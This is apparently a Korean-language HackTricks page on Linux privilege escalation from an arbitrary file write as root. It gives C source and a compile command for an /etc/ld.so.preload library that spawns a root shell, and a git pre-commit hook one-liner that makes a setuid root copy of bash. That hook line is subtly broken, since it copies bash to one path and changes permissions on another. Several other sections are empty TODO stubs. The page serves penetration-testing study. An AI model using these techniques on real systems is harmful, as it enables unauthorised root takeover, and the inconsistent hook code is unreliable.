# 루트에 임의 파일 쓰기

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

이 파일은 **`LD_PRELOAD`** 환경 변수처럼 작동하지만 **SUID 바이너리**에서도 작동합니다.\
이 파일을 생성하거나 수정할 수 있다면, 실행되는 각 바이너리와 함께 로드될 **라이브러리의 경로를 추가**할 수 있습니다.

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 git 리포지토리에서 커밋이 생성되거나 병합될 때와 같은 다양한 **이벤트**에서 **실행되는** **스크립트**입니다. 따라서 **특권 스크립트 또는 사용자**가 이러한 작업을 자주 수행하고 **`.git` 폴더**에 **쓰기**가 가능하다면, 이를 **privesc**에 사용할 수 있습니다.

예를 들어, git 리포지토리의 **`.git/hooks`**에 **스크립트**를 **생성**하여 새로운 커밋이 생성될 때마다 항상 실행되도록 할 수 있습니다:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

`/proc/sys/fs/binfmt_misc`에 위치한 파일은 어떤 바이너리가 어떤 유형의 파일을 실행해야 하는지를 나타냅니다. TODO: 일반 파일 유형이 열릴 때 rev shell을 실행하기 위해 이를 악용할 요구 사항을 확인하십시오.

{{#include ../../banners/hacktricks-training.md}}
